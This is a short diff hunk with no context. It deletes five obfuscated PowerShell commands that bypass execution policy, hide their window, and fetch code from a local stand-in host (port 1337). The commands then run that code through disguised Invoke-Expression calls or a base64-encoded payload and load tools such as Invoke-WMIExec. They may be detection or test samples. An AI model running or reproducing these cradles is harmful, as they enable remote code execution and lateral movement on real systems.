@@ -1,5 +1,0 @@
-powershell -nop -noni -ep bypass -w h -c "$u=('http://127.0.0.1:1337/' | ForEach-Object { Invoke-RestMethod $* });&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module I`nvoke-WMIExec.ps1; I`nvoke-WMIExec"
-powershell -nop -noni -ep bypass -w h -c "$u=('http://localhost:1337/'|%{(IRM $*)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module Invoke-WMIExec.ps1; Invoke-WMIExec"
-pwsh.exe -nop -noni -ep bypass -w h -c "$u=('http://127.0.0.1:1337/'|%{(IRM $_)});&(''.SubString.ToString()[67,72,64]-Join'')($u); Import-Module Invoke-WMIExec.ps1; Invoke-WMIExec"
-powershell.exe -e JAB1AD0AKAAiAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADMAMwA3AC8AIgApADsAJABtAD0AaQByAG0AIAAkAHUAOwAkAG0AIAB8ACAAJQB7ACQAXwB9ADsAaQBlAHgAKAAkAG0AKQA7AEkAbQBwAG8AcgB0AC0ATQBvAGQAdQBsAGUAIABDAA6AFwAVABlAG0AcABcAEkAbgB2AG8AawBlAC0AVwBNAEkARQB4AGUAAGMALgBwAHMAMQA=
-powershell.exe -NoP -C "$s='ht'; $s+='tp://127.0.0.1:1337'; $m=Invoke-RestMethod -Uri $s; $m | ForEach-Object { $_ }; &('I'+'EX')($m); Import-Module Tools.ps1"
